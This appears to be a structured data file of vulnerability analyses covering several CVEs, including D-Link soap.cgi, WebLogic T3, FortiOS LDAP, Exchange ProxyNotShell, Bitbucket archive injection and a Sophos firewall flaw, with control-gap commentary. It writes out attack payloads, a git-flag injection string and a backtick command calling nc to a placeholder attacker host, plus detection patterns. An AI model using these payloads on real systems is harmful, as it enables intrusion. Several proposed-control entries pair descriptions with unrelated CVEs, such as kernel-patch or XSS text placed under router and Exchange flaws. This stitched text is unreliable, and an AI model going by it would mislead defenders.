response.adequacy: For the three models that never received the complete fix there is no firmware to return to, so reflashing reinstalls the exposure. Replacement is the only end state, and until it happens the device stays enrollable as attack infrastructure.

NIST-800-53-SI-2.gap: SI-2 assumes identifying a flaw leads to an available fix, and here the sequence terminates: the 2018-02-28 firmware was bypassable with `&&`, the corrected build reached only two of the models in January 2019, and the rest went out of support in 2020 with no complete fix ever issued. A programme executing perfectly installs a patch CISA's own required action says does not close the CVE, then has nothing further to install.

EU-CRA-Art13.gap: Art.13 — security by design, a declared support period, free updates throughout it, vulnerability handling across the product lifetime — describes exactly what failed: an incomplete first fix, a second fix delivered to two of the affected models, end of support declared while the devices stayed in service. But the CRA binds products placed on the market from its application date, and these routers shipped in 2014-2015, so the installed base still answering /soap.cgi is outside its reach entirely.

UK-CAF-B4.gap: B4 is assessed against systems the organisation knows it operates. These are consumer routers at homeworker premises and small branch sites, bought and installed outside procurement and absent from the CAF-scoped register, so corporate-estate outcomes can be scored as achieved while a homeworker's VPN terminates on an end-of-support DIR-880L executing shell commands taken straight from an unauthenticated query parameter.

AU-Essential-8-Patch.gap: Both triggers fire on paper — an internet-facing device with a working public exploit, and an operating system no longer vendor-supported — and neither produces a finding, because assessment is bounded to the organisation's own systems and a homeworker's or small-branch router is not one of them. Maturity Level Three on the managed fleet is compatible with routing that fleet's traffic through this device.

ISO-27001-2022-A.8.9.gap: A.8.9 wants configurations established, documented and monitored against a baseline, and the setting that decides everything here — whether remote/WAN administration is on, and therefore whether /soap.cgi faces the internet — is a consumer toggle set by whoever unboxed the router. The gap between D-Link's LAN-side claim and NVD's AV:N score is entirely that toggle, and it sits in a configuration register that never included the device.

new_control_requirements.name: SCANNER-PAPER-COMPLIANCE-TEST
new_control_requirements.description: A vulnerability scanner that reports 'patched' based on kernel package version alone is paper compliance. The operational test: does the scan account for the module-unload mitigation surface, AND does it verify the kernel is on a build that includes the specific Fragnesia patch (not just any version newer than the Dirty Frag patch that introduced Fragnesia)?
new_control_requirements.evidence: CVE-2018-6530’s first fix was not a fix: D-Link’s 2018-02-28 firmware left the same soap.cgi handler reachable through an && substring (CVE-2018-20114), and CISA’s KEV required action names that later build as what properly patches this entry — so any scanner or attestation that reports remediated because the firmware is newer than the February 2018 release is reporting paper compliance on three models that never received a complete fix at all.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life devices with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal since no remediation exists.
new_control_requirements.evidence: CVE-2018-6530 ends in decommissioning rather than patching: SAP10189 put the DIR-868L and DIR-880L out of support on 2020-08-07 and SAP10190 covers the DIR-860L and DIR-865L, firmware development has ceased, and for the models that never got the CVE-2018-20114 correction a factory reset or reflash reinstalls an unauthenticated root command-injection endpoint, so isolation plus a bounded replacement window is the only remaining treatment.

new_control_requirements.name: UNSUPPORTED-NETWORK-DEVICE-ENUMERATION-AND-RETIREMENT
new_control_requirements.description: Every network-attached embedded device (IP cameras, video servers, NVRs, routers, print/scan appliances) must carry an end-of-support date in the asset inventory, and any device past that date that exposes a remotely reachable management or media surface must be removed from untrusted networks and scheduled for replacement — patching is not an option once the vendor retires the model. The distinguishing test: query the asset inventory for devices whose firmware lifecycle has ended and whose management interface is reachable from an untrusted segment; any non-empty result that lacks a replace-or-formally-risk-accept decision is a finding. Paper patch-management policies that assume a fix always exists leave actively-exploited EOL devices (GeoVision IP cameras, recruited by Mirai-style botnets) on the network indefinitely.
new_control_requirements.evidence: CVE-2018-6530 affects consumer routers bought and installed outside procurement at homeworker premises and small branch sites, so they carry no end-of-support date in any register and no assessment ever reaches them even though a homeworker VPN may terminate on an end-of-support DIR-880L executing shell commands from an unauthenticated query parameter — enumeration of every network-attached embedded device is what makes the exposure visible.

attack_vector.description: The attacker completes the T3 handshake against TCP/7001 and sends a serialized Java object containing crafted ClassTableEntry structures, delivering a ysoserial CommonsCollections gadget chain over JRMP from an attacker-run listener; WebLogic deserializes it before any authentication decision and executes the command. Oracle's April 2018 fix blacklisted sun.rmi.server.UnicastRef and constrained java.rmi.registry.Registry inside resolveProxyClass, and published bypasses simply substituted java.rmi.activation.Activator or wrapped RemoteObjectInvocationHandler inside weblogic.jms.common.StreamMessageImpl — the route that became CVE-2018-2893 in the July 2018 Critical Patch Update.
attack_vector.privileges_required: none — PR:N/UI:N; the T3 listener is enabled by default, shares port 7001 with the HTTP listener, and deserializes attacker-supplied objects before authentication, so network reachability is the only precondition
attack_vector.complexity: low — AC:L; the payload is ysoserial plus a JRMP listener, which is why Exploit-DB 44553 landed four days after the April 2018 CPU and Rapid7 ships exploit/multi/misc/weblogic_deserialize against the same path. The complication is remediation state rather than exploitation: 'is this host patched' is a two-CPU question, and a host carrying only the April patch remains exploitable
attack_vector.ai_factor: Not AI-discovered — credited to Liao Xinxi of the NSFOCUS Security Team, with independent researcher loopx9 named in contemporaneous reporting on Oracle's April 2018 CPU, in the established Java gadget-chain research tradition. The bypass work that became CVE-2018-2893 was likewise manual: researchers reading Oracle's resolveProxyClass blacklist and naming classes it failed to cover. No AI-assisted discovery is claimed at any point in the chain.

prevention.what_would_have_worked: Apply at minimum the July 2018 Critical Patch Update — not April's — to WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3 through OPatch, restarting the admin and managed servers, and independently restrict T3 with weblogic.security.net.ConnectionFilterImpl connection filters or a network ACL in front of port 7001 so untrusted hosts never reach the listener.
prevention.adequacy: The April CPU was a class blacklist rather than a fix to the deserialization path, and public bypasses appeared within days, so an April-only host stayed exploitable until July. The connection filter is the control that actually removes the attack surface regardless of CPU level, and it is the one action here that does not depend on Oracle having enumerated the right gadget classes.

detection.what_would_have_worked: Alert on an inbound T3 or T3S handshake on TCP/7001 followed by a Java serialization stream beginning AC ED 00 05, on the WebLogic JVM opening an outbound JRMP/RMI connection to an external host immediately after an inbound T3 connection, on the server process spawning /bin/sh -c or cmd.exe /c or writing .jsp files under servers/*/tmp/_WL_internal, and on serialized Activator or StreamMessageImpl classes appearing in T3 payloads.
detection.adequacy: Strong, and it discriminates patch state: InvalidClassException and resolveProxyClass rejections in managed-server logs mark blocked attempts against an April-patched host, while Activator and StreamMessageImpl in the payload are precisely the forms that defeat that patch — so the log tells an operator whether their remediation is holding.

response.what_would_have_worked: Treat a host with unexplained .jsp or .class artifacts under the domain directory, or outbound connections to mining pools or unfamiliar RMI endpoints, as compromised: rebuild the domain from source deployment artifacts, rotate datasource and keystore credentials, and pivot the hunt to everything the WebLogic service account could reach.
response.adequacy: Pre-authentication code execution as the application-server identity exposes every database credential and keystore in the domain configuration. Applying the July CPU afterwards closes the vector but leaves any webshell already dropped into the staging directories running.

NIST-800-53-SI-2.gap: SI-2 measures whether the vendor patch was installed, and for three months that measurement returned a false negative at scale. The April 2018 CPU blacklisted specific classes inside resolveProxyClass instead of fixing pre-authentication deserialization of T3 traffic, so an attestation showing cpuapr2018 installed was evidence of a still-exploitable, internet-reachable listener rather than of remediation.

NIS2-Art21-patch-management.gap: Art.21 expresses vulnerability handling as a cadence keyed to vendor releases, and Oracle ships WebLogic fixes quarterly. A programme perfectly synchronised to that cadence had no move available between April and July 2018 — exactly the window in which the blacklist was publicly known to be bypassable and port 7001 was being mass-scanned. Cadence cannot respond to an incomplete vendor fix, because there is nothing to apply until the next window opens.

UK-CAF-B4.gap: B4 expects unnecessary services and interfaces to be removed and the rest secured, but T3 is not removable in that sense: it is WebLogic's own administration and clustering protocol, multiplexed onto the same port 7001 as HTTP. Hardening the visible tier with TLS, a WAF and application authentication leaves the same socket deserializing untrusted Java objects pre-authentication, and nothing in a B4 review prompts an assessor to separate two protocols on one port.

AU-ISM-1546.gap: This is the maximum case on both of ISM-1546's axes — an internet-facing application, CVSS 9.8, working public exploit four days after the vendor fix — and the control still fails, because 'patched' is a binary state in the assessment with no expression for a vendor patch that is itself incomplete. A host recorded as remediated on the April CPU dropped out of the remediation queue while the bypass route stayed open until July.

ISO-27001-2022-A.8.8.gap: A.8.8 would have prioritised this correctly on CVSS, EPSS and KEV status, then closed the finding on the wrong evidence, because its remediation step is to apply the vendor patch and April's patch was a class blacklist. The action that genuinely removes the exposure is architectural — a T3 connection filter or a network ACL — and A.8.8 never requires verifying that a patch addresses the mechanism rather than one known instance of it.

new_control_requirements.name: APPSERVER-REMOTING-PROTOCOL-RESTRICTION
new_control_requirements.description: Application servers that expose binary remoting protocols (Oracle WebLogic T3/IIOP, and equivalents) must restrict those protocols to trusted hosts and apply vendor critical patch updates on an accelerated schedule when a remoting flaw is KEV-listed. Place T3/IIOP behind a connection filter (weblogic.security.net.ConnectionFilterImpl) or network ACLs so only known hosts can reach them, never expose the ports to untrusted networks, and apply the Oracle CPU bundle (with server restart) rather than deferring to the next quarterly window. The distinguishing test: from an untrusted network segment, attempt an unauthenticated T3/IIOP connection to a staging WebLogic instance and confirm it is refused at the connection filter before any data is served - a perimeter-firewall + quarterly-patch policy that still leaves T3/IIOP reachable from an internal untrusted segment leaves the unauthenticated data-access path open.
new_control_requirements.evidence: CVE-2018-2628 is unauthenticated deserialization of T3 traffic on WebLogic port 7001, where T3 is multiplexed onto the same socket as HTTP so TLS, a WAF and application authentication leave the pre-authentication listener untouched; the one action that removes the attack surface independent of which Critical Patch Update is installed is a weblogic.security.net.ConnectionFilterImpl filter or a network ACL in front of 7001 so untrusted hosts never reach the protocol.

new_control_requirements.name: SCANNER-PAPER-COMPLIANCE-TEST
new_control_requirements.description: A vulnerability scanner that reports 'patched' based on kernel package version alone is paper compliance. The operational test: does the scan account for the module-unload mitigation surface, AND does it verify the kernel is on a build that includes the specific Fragnesia patch (not just any version newer than the Dirty Frag patch that introduced Fragnesia)?
new_control_requirements.evidence: CVE-2018-2628’s April 2018 Critical Patch Update was a class blacklist inside resolveProxyClass (sun.rmi.server.UnicastRef, java.rmi.registry.Registry) rather than a fix to the deserialization path, and bypasses using java.rmi.activation.Activator and weblogic.jms.common.StreamMessageImpl were public within days, so for three months an attestation showing cpuapr2018 installed was evidence of a still-exploitable internet-reachable listener — the check must be that the build carries the July fix, not merely a CPU newer than April.

new_control_requirements.name: INCOMPLETE-PATCH-SEQUENCE-SEVERITY-MULTIPLIER
new_control_requirements.description: Vulnerability-management programs must apply a severity multiplier when a CVE is the Nth in an incomplete-patch sequence on the same primitive (third MOTW bypass, second AMSI bypass, etc.). Framework controls treating each CVE as discrete obscure the structural defect; the Nth CVE in a sequence implies that future bypasses on the same primitive are likely.
new_control_requirements.evidence: CVE-2018-2628 is the first of a two-CVE sequence on the same T3 deserialization primitive, re-fixed three months later as CVE-2018-2893 after the initial blacklist was bypassed; treating each as a discrete quarterly patch item hid the structural defect and left hosts recorded as remediated in April sitting in the mass-scanning window until July, which is exactly the case a severity multiplier for Nth-in-sequence incomplete patches exists to surface.

CVE-2018-13374.name: Fortinet FortiOS and FortiADC Improper Access Control Vulnerability

attack_vector.description: Holding a read-only administrator session, the attacker authenticates to the FortiGate web interface via /logincheck, reads the configured bind username and port from /p/user/ldap/json/, opens a listening socket on their own host, then POSTs to the /api/ldap connectivity-test endpoint with the LDAP server address rewritten to their IP and the `secure` flag set to 0. The appliance obediently performs the bind against the rogue server over cleartext LDAP, and the attacker reads the bind password straight off the protocol stream. There is no memory corruption and no race — the appliance is simply asked to authenticate to a server the caller chose.
attack_vector.privileges_required: low — PR:L; a read-only administrator session, which is the lowest administrative tier on the appliance and the one handed to auditors, MSPs, NOC staff and monitoring integrations
attack_vector.complexity: low — AC:L; no memory corruption, no race and no user interaction, and the attacker supplies only a listening socket because the FortiGate performs the outbound bind itself. The published reproducer is a short Python script
attack_vector.ai_factor: Not AI-discovered — FG-IR-18-157 credits Julio Engels Ureña Martinez for a responsible-disclosure report, and the same researcher published Exploit-DB 46171 the following January. The finding is a manual authorisation-model review: noticing that the connectivity-test endpoint accepts both a caller-supplied server address and a caller-supplied `secure` flag while remaining available to the read-only profile. No fuzzing, automated analysis or AI tooling is claimed.

prevention.what_would_have_worked: Upgrade FortiOS to 5.6.8, 6.0.3 or 6.2.0 and later, and FortiADC to 5.4.5, 6.0.2 or 6.1.1 and later per FG-IR-18-157, then rotate the directory bind account that was configured on the appliance and re-scope it to the minimum directory read the device actually needs.
prevention.adequacy: Patching alone is not remediation, because the flaw leaks a credential rather than granting execution — any bind account configured before the upgrade has to be treated as disclosed. While the reboot is scheduled, removing read-only profiles that do not need GUI or API access, binding admin accounts to trusted-host source restrictions, and egress-filtering the appliance so it can only open LDAP connections to the real directory servers all close the path.

detection.what_would_have_worked: Alert on the FortiGate opening an outbound LDAP bind on TCP/389 to an address that is not a configured directory server, on an /api/ldap test whose server address differs from the stored LDAP object with `secure` set to 0, on a read-only session reading /p/user/ldap/json/ and immediately calling the test endpoint, and — directory-side — on authentication events for the FortiGate's bind DN sourced from any host that is not the FortiGate.
detection.adequacy: The directory-side signal is the one that survives after the fact: it shows the harvested credential already in use elsewhere. The appliance-side sequence is precise but depends on admin-session and API logging that most estates never forward off the device.

response.what_would_have_worked: Rotate the bind account immediately and everywhere it was reused — this credential class is routinely shared across appliances — then review directory logs for reads performed with it and for onward authentication seeded from it, and re-scope the account before reconfiguring it.
response.adequacy: The 4.3 base score badly understates the response scope: the disclosed secret usually carries broad read across AD or LDAP, so a Low-confidentiality finding on one appliance becomes directory-wide reconnaissance and a credential-stuffing seed for the entire estate, which is why KEV records ransomware campaign use as Known.

NIST-800-53-AC-6.gap: Least privilege depends on there being a genuinely low tier to assign, and 'read-only administrator' is the tier organisations hand out precisely because it is assumed safe. On affected FortiOS that profile can redirect the LDAP connectivity test to a caller-controlled server and force a cleartext bind, so the least-privileged administrative role is itself a credential-read primitive for the directory service account — shrinking privilege shrank nothing.

NIS2-Art21-identity-management.gap: Art.21's identity-management and MFA measures cover administrative access by people. The credential disclosed here is the non-interactive LDAP bind account the appliance uses to query the directory — the identity class MFA structurally cannot cover. Every human admin can be behind a second factor while a long-lived static password with broad directory read, commonly shared across appliances, walks out unrotated.

UK-CAF-B2.gap: B2 turns on how each role is classified, and a FortiGate read-only administrator is classified as non-privileged in any such review because it cannot change configuration — so it is off the privileged-access register and outside the enhanced session monitoring B2 expects. The exploit converts exactly that role into possession of a directory bind credential, which makes the control's own classification the reason the finding is invisible.

AU-Essential-8-MFA.gap: The multi-factor authentication strategy targets logons by users — to internet-facing services, to privileged actions, to important data repositories. The authentication event that leaks the secret is the appliance's own machine-to-machine LDAP bind: no user, no second factor, no place in the model, and no requirement anywhere in the strategy to scope, rotate or monitor service-bind credentials held on network appliances.

ISO-27001-2022-A.8.24.gap: A.8.24's obvious rule here — directory traffic must use LDAPS — is enforced only on the configured connection. The connectivity-test endpoint accepts a caller-supplied `secure` flag and the public exploit sets it to 0, so a read-only administrator elicits the same bind password over plaintext TCP/389 regardless of what the stored LDAP object specifies. The control governs the cryptography an organisation configures, not a second code path that lets the caller decide whether cryptography applies.

new_control_requirements.name: FLEET-CONTROL-PLANE-ADMIN-PRIVILEGE-TIER
new_control_requirements.description: Administrators of fleet-control-plane systems (MDM/UEM, EDR consoles, identity providers, container orchestrators, configuration management) must be classified as a distinct privilege tier above application admins, with: PAM-jumphost-only access, FIDO2 step-up per session, just-in-time elevation with approval workflow, separate identity from any other admin role, and dedicated PAW (privileged access workstation) hardware. Compliance frameworks must enumerate this tier explicitly rather than collapsing it into 'admin'.
new_control_requirements.evidence: CVE-2018-13374 turns the FortiOS read-only administrator — the tier handed to auditors, MSPs, NOC staff and monitoring integrations precisely because it is assumed safe and is therefore left off every privileged-access register — into a credential-read primitive for the appliance’s directory bind account, so classifying network-appliance admin roles as a distinct privilege tier with jump-host-only access and step-up authentication is what stops the least-privileged role being the exploit precondition.

new_control_requirements.name: PERIMETER-COMPROMISE-REBUILD-NOT-PATCH
new_control_requirements.description: Pre-rehearsed IR runbook for any perimeter device that suffers a pre-auth RCE CVE in active exploitation MUST default to config-exfil + rebuild + credential rotation, not patch-in-place. Patch-in-place leaves attacker-installed implants intact.
new_control_requirements.evidence: CVE-2018-13374 leaks a credential rather than granting execution, so upgrading FortiOS to 5.6.8/6.0.3/6.2.0 or FortiADC to 5.4.5/6.0.2/6.1.1 per FG-IR-18-157 is not remediation on its own: every directory bind account configured on the appliance before the upgrade must be treated as disclosed, rotated everywhere it was reused across other appliances, and re-scoped to minimum directory read — patch-in-place leaves the attacker holding a still-valid static password, which is why KEV records ransomware campaign use.

new_control_requirements.name: FIREWALL-EGRESS-TELEMETRY-SEPARATE-TRUST-ZONE
new_control_requirements.description: Firewall and other perimeter-trust-boundary devices must forward syslog, threat logs, and authentication logs to a SIEM hosted in a separate trust zone (different management plane, different credentials, different authentication path). Telemetry stored on the compromised device is destroyed by the attacker; telemetry on a separate-trust-zone collector survives.
new_control_requirements.evidence: CVE-2018-13374 is detectable only in logs most estates never move off the box — an /api/ldap test whose server address differs from the stored LDAP object with secure set to 0, a read-only session reading /p/user/ldap/json/ and immediately calling the test endpoint, an outbound bind on TCP/389 to a non-configured host — and the surviving signal is directory-side authentication for the FortiGate’s bind DN sourced from another host, so appliance admin-session and API logs must reach a SIEM in a separate trust zone.

CVE-2022-41040.name: Microsoft Exchange Server Server-Side Request Forgery Vulnerability

attack_vector.description: An attacker holding a single valid mailbox credential sends a crafted request to /autodiscover/autodiscover.json with an embedded @ that confuses the Exchange front-end proxy's routing, coercing the front end into proxying the request to the Remote PowerShell back end it is supposed to shield. The deserialization flaw CVE-2022-41082 in that back end then executes code as SYSTEM, and the in-the-wild chains GTSC and Unit 42 observed dropped China Chopper web shells for persistence.
attack_vector.privileges_required: low — PR:L; one valid mailbox credential, which phishing or password spraying against an internet-facing OWA supplies routinely
attack_vector.complexity: low — AC:L with no user interaction; the public Metasploit module rates ExcellentRanking with CRASH_SAFE and REPEATABLE_SESSION and automates the full SSRF-to-RCE chain against Exchange Server 2019
attack_vector.ai_factor: Not AI-discovered — GTSC analysts surfaced it as an in-the-wild zero-day during a customer SOC investigation in August 2022 and reported the pair through the Zero Day Initiative. No AI tooling is credited in discovery or weaponisation.

prevention.what_would_have_worked: Install the November 2022 Exchange security update KB5019758 (Exchange 2013 CU23 15.0.1497.44, 2016 CU22 15.1.2375.37 / CU23 15.1.2507.16, 2019 CU11 15.2.986.36 / CU12 15.2.1118.20), and during the weeks before it existed, withdraw OWA/Autodiscover from direct internet exposure and disable remote PowerShell for non-administrators rather than relying on the URL-rewrite rule.
prevention.adequacy: The KEV due date of 2022-10-21 fell 18 days before a patch existed, so BOD 22-01 could not be satisfied by patching at all; Microsoft revised the interim URL-rewrite rule at least three times and it was bypassed outright, with CrowdStrike's OWASSRF reaching the same PowerShell back end through OWA, leaving exposure reduction as the only measure that held.

detection.what_would_have_worked: Hunting Exchange IIS logs for the published powershell.*autodiscover\.json.*\@.*200 request pattern, and sweeping the Exchange web directories for China Chopper web shells.
detection.adequacy: The exploitation step is an ordinary authenticated HTTPS request with no malware, no anomalous process and no new account, so the IIS-log pattern was the only pre-web-shell signal — and it was not published until 2022-09-29, well into the campaign.

response.what_would_have_worked: Isolate the server, hunt and remove web shells, rotate credentials for every mailbox and service account the host handled, then apply KB5019758 and re-verify before returning it to service.
response.adequacy: Patching alone does not evict an attacker who reached SYSTEM and dropped China Chopper; a patched Exchange server is only clean once the web-shell hunt comes back empty.

NIST-800-53-SC-7.gap: Boundary protection was implemented exactly as SC-7 intends — the Remote PowerShell endpoint denied from the internet — but the malicious hop is issued by the Exchange front end itself, so it originates inside the trust boundary and never crosses a filtered interface. The attacker only has to reach /autodiscover/autodiscover.json, which the boundary exists to allow.

NIS2-Art21-patch-management.gap: Art.21 vulnerability handling gives an entity a process, not a fix. Between MSRC's 2022-09-29 guidance and the 2022-11-08 update there was nothing to deploy, and the mitigation on offer was revised three times and defeated, so a fully compliant programme documented a 40-day exposure on an internet-facing mail server it had no means to close.

UK-CAF-C1.gap: C1 monitoring had nothing to observe: no malware executed, no process anomaly appeared and no account was created. The single distinguishing artefact lived in Exchange IIS logs, a source most monitoring estates of the period did not ingest, so the first visible event was the second-stage web shell.

AU-Essential-8-Patch.gap: The Essential Eight clock starts when a vendor patch ships, and none existed until 2022-11-08. An organisation assessed at Maturity Level 3 was still serving an exploitable OWA/Autodiscover endpoint through the whole campaign, and no E8 control would have required taking that endpoint off the internet in the interim.

ISO-27001-2022-A.8.8.gap: A.8.8 would have ranked this correctly on CVSS 8.8 and EPSS near 0.9996 and scheduled it — but scheduling was the wrong instrument. The measures that actually reduced risk before the update, disabling remote PowerShell for non-administrators and pulling OWA/Autodiscover off the internet, sit outside A.8.8's patch-shaped remediation vocabulary.

new_control_requirements.name: MITIGATION-ACTIVE-PATCH-PENDING-VERDICT-CLASS
new_control_requirements.description: Compliance verdicts must distinguish three states: (a) binary patch deployed (vulnerability eliminated), (b) vendor-mitigation rule active, no binary patch (residual risk: any defect in the mitigation rule reopens the vulnerability), (c) no mitigation, no patch (full exposure). Audit reports must surface (b) as a distinct compensating-control state with an associated time-bound action item, not as a 'patched per SLA' outcome.
new_control_requirements.evidence: CVE-2022-41040 spent 40 days — MSRC guidance on 2022-09-29 to KB5019758 on 2022-11-08 — in state (b): no binary patch existed and the only vendor measure was a URL-rewrite rule Microsoft revised at least three times and that CrowdStrike's OWASSRF technique bypassed outright by reaching the same Remote PowerShell back end through OWA. An operator recording that rewrite rule as 'remediated' was reporting an outcome the vendor never claimed, on an internet-facing mail server whose KEV due date of 2022-10-21 fell 18 days before a fix existed.

new_control_requirements.name: OWA-PER-REQUEST-SIEM-INGESTION
new_control_requirements.description: Exchange OWA per-request access logs (not just authentication events) must be forwarded to an external SIEM with at least 90-day retention. Authentication-only logging misses XSS-stage telemetry — the malicious request flows over an already-authenticated session.
new_control_requirements.evidence: CVE-2022-41040's exploitation step is an ordinary authenticated HTTPS request to /autodiscover/autodiscover.json — no malware, no anomalous process, no new account — so the single pre-web-shell signal was the Exchange IIS request pattern powershell.*autodiscover\.json.*\@.*200, published only on 2022-09-29 and well into the campaign. Estates ingesting Exchange authentication events but not per-request OWA/Autodiscover access logs had no detection surface until the second-stage China Chopper web shell landed.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: CVE-2022-41040 was KEV-listed on 2022-09-30 with confirmed ransomware use and EPSS 0.99956, and by the time KB5019758 shipped on 2022-11-08 a Metasploit module rated ExcellentRanking already automated the full SSRF-to-RCE chain. A clock that starts at KEV listing or patch availability — whichever is later — and allows documented compensating controls is the only scheduling instrument that covers both the pre-patch window and the post-patch scramble.

CVE-2022-36804.name: Atlassian Bitbucket Server and Data Center Command Injection Vulnerability

attack_vector.description: A single GET to the repository archive endpoint /rest/api/latest/projects/{key}/repos/{slug}/archive carries a URL-encoded null byte in the prefix parameter — prefix=ax%00--exec=`id`%00--remote=origin — which terminates the intended value and appends attacker-chosen flags to the git-archive argv. git then runs the injected command as the atlbitbucket service user, and the server helpfully returns the output in an HTTP 500 CommandFailedException.
attack_vector.privileges_required: low — PR:L; read access to one repository, which any instance hosting a public repository grants anonymously, which is why researchers describe it as pre-auth RCE
attack_vector.complexity: low — AC:L, one HTTP request, no user interaction; a Metasploit module rated ExcellentRanking and a Nuclei template that self-discovers project keys and slugs from /rest/api/latest/repos make it point-and-shoot
attack_vector.ai_factor: Not AI-discovered — reported through Atlassian's public bug bounty by the researcher TheGrandPew, with independent root-cause analyses from Rapid7 and Assetnote afterwards. No AI-assisted discovery tooling is credited by anyone in the chain.

prevention.what_would_have_worked: Upgrade to 7.6.17, 7.17.10, 7.21.4, 8.0.3, 8.1.3, 8.2.2 or 8.3.1 — the fix is a NUL-byte filter on command arguments — and move Bitbucket Mesh nodes to the matching version per Atlassian's compatibility matrix.
prevention.adequacy: Atlassian's interim guidance of disabling public repositories only shrinks the attacker pool, because read access to any single private repository still reaches the vulnerable archive endpoint. Bitbucket Server also reached end of support on 2024-02-15, so surviving Server-line instances receive no further security fixes and must move to Data Center or Cloud rather than being patched in place.

detection.what_would_have_worked: Alerting on requests to the archive and commit-diff endpoints containing encoded NUL (%00) or git flags such as --exec, --output or --line-prefix, and on HTTP 500 responses carrying com.atlassian.bitbucket.scm.CommandFailedException with command output in the body.
detection.adequacy: The 500-with-CommandFailedException is the exploit's own success oracle, which makes it a reliable signal — but it only fires after the injected command has already executed as atlbitbucket.

response.what_would_have_worked: Treat execution as atlbitbucket as full SCM compromise: audit every repository, hook and CI credential on the host, rotate all tokens and deploy keys the instance held, and review recent commits and pipeline definitions for tampering.
response.adequacy: Only response reaches the downstream risk — code execution on the source-of-truth SCM contaminates every build that pulled from it, and upgrading the application does not undo a poisoned commit or a stolen pipeline credential.

NIST-800-53-SI-10.gap: Input validation is exactly what was missing — HTTP parameters concatenated into a git argv with no NUL rejection, and Atlassian's fix is literally that filter — but SI-10 binds systems the operator develops, not argv construction inside a purchased SCM, so an SI-10-assessed environment carried no coverage for the one defect class that mattered.

NIS2-Art21-supply-chain.gap: Supply-chain measures point outward at supplier assurance, while Bitbucket is the source of truth for the operator's own build inputs. Execution as atlbitbucket yields write access to every repository, hook and CI credential on the host, so risk flows inward from the internet and outward into every downstream build — a direction questionnaires and contract clauses never test.

UK-CAF-B4.gap: B4 credits keeping repositories private as hardening, but the threshold is read access to a single repository, granted anonymously wherever any public repository exists. The archive endpoint is core Bitbucket function and cannot be removed, so B4's configuration levers narrow the attacker pool without closing the path.

AU-ISM-1546.gap: ISM-1546 scales patch timeframes by whether a system is internet-facing, and most Bitbucket Server deployments sit on the corporate network and inherit the longer window. Atlassian's advisory landed 2022-08-24; a working public exploit, a Metasploit module and in-the-wild attempts followed within about four weeks, outrunning a clock keyed to exposure classification rather than to exploit availability.

ISO-27001-2022-A.8.28.gap: Secure coding governs the certified organisation's own development lifecycle. Building an external command's argument vector from unvalidated HTTP parameters is precisely what A.8.28 exists to prevent, but Atlassian shipped it — so certification buys an audited internal programme and no assurance whatever over the code that executed the attacker's git flags.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: CVE-2022-36804 had fixed builds from Atlassian's 2022-08-24 advisory, but a Metasploit module, a Nuclei template that self-discovers project keys and slugs, and in-the-wild attempts arrived roughly four weeks later, with KEV listing on 2022-09-30. Most Bitbucket Server deployments sit on the corporate network and inherit the longer patch window that keys on exposure classification; a KEV-listing-triggered clock is what re-prioritises an internally-classified SCM the moment point-and-shoot tooling exists.

new_control_requirements.name: ORPHAN-COMMIT-RELEASE-DETECTION
new_control_requirements.description: Reject release tags whose target commit is not reachable from the default branch (`git merge-base --is-ancestor`). Forged orphan-commit releases are a signature of the maintainer-impersonation supply chain pattern.
new_control_requirements.evidence: CVE-2022-36804 yields execution as atlbitbucket — write access to every repository, hook, tag and CI credential on the source-of-truth SCM — so the attacker can publish a release from a commit that was never on the default branch and every downstream build inherits it. Supplier questionnaires test the inbound relationship, while a tag-reachability gate is the only check that catches the outbound direction, where risk flows from a breached in-house SCM into consumers' builds.

attack_vector.description: An unauthenticated POST to the User Portal Controller servlet (/userportal/Controller, mode=451 on TCP 443) or the Web Admin servlet (/webconsole/Controller, mode=151 on TCP 4444) carries a json parameter whose object contains a _discriminator key. That key is never validated before its value reaches a Perl eval in CyberAPIArch.pm, so a curvalue such as ;`nc <attacker-host> 80` is evaluated as Perl and its backticks execute a shell command as root on the appliance.
attack_vector.privileges_required: none — PR:N; the injected value is evaluated before any authentication step, and the resulting command already runs as root, so there is no privilege stage after execution
attack_vector.complexity: low — AC:L, a single HTTP POST with no user interaction; no Metasploit module exists, but a verified Nuclei template automates discovery and exploitation end to end with out-of-band callback confirmation
attack_vector.ai_factor: Not AI-discovered — Sophos published the advisory with no researcher credit alongside its own statement that the flaw was already being used against a small set of organisations, chiefly in South Asia, so it surfaced through response to observed attacks. The ZDI root-cause write-up a month later analysed the patch. No AI tooling appears in any primary account.

prevention.what_would_have_worked: Leave 'Allow automatic installation of hotfixes' enabled so the 2022-09-21 and 2022-09-23 hotfixes install without a firmware upgrade or reboot, move to the permanent fix in firmware v18.5 MR5, v19.0 MR2 or v19.5 GA or later, and keep the User Portal and Webadmin off WAN interfaces by managing the device through VPN or Sophos Central.
prevention.adequacy: The auto-hotfix reached roughly 99% of affected organisations within days, but it can be switched off and did not cover end-of-life firmware — Sophos had to republish backports in December 2023 after fresh exploit attempts — so 'hotfix available' must be verified against each appliance's applied-hotfix state rather than assumed.

detection.what_would_have_worked: Watching for POSTs to /userportal/Controller with mode=451 or /webconsole/Controller with mode=151 carrying a _discriminator key, for the appliance's characteristic Server: xxxx / text-plain redirectionURL reply to unauthenticated requests, and for outbound connections initiated by the firewall itself.
detection.adequacy: The firewall is normally the sensor rather than the subject, and few estates log inbound requests to the appliance's own portal, so the first practical observable is usually egress from the device — that is, after root has already been obtained.

response.what_would_have_worked: Rebuild the appliance from known-good firmware, rotate every credential, certificate and VPN secret it held, and re-examine the segmentation and filtering decisions it was enforcing while compromised.
response.adequacy: Because the code runs as root inside the device that anchors trust for everything behind it, only rebuild-and-rotate restores that anchor; a hotfix applied over an already-compromised appliance closes the entry point while leaving the attacker in place.

NIST-800-53-CM-7.gap: Least functionality has nothing to switch off here: the vulnerable Controller servlets are the User Portal and Webadmin, core appliance functions shipped listening on TCP 443 and TCP 4444, and no supported configuration disables the Perl eval sink. A CM-7 assessment records the device as minimised while it stays pre-auth exploitable.

